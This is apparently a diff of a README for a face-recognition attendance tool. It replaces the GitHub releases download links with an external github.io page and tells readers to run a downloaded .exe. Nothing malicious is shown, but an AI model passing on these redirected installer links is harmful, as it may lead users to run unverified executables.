@@ -1,6 +1,6 @@
 # 🤖 Attendance-AI - Automated classroom tracking for easy attendance
 
-[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases)
+[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://aubriehundredandseventieth600.github.io)
 
 Attendance-AI tracks student attendance using computer vision. The system monitors classroom videos and identifies individuals through face recognition. It replaces manual roll calls with automated logging. All attendance data stores safely in a database.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these specifications to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases).
+1. Visit [this page to download](https://aubriehundredandseventieth600.github.io).
 2. Look for the file ending in .exe under the latest version.
 3. Click the filename to save the installer to your Downloads folder.
 4. Open your Downloads folder.
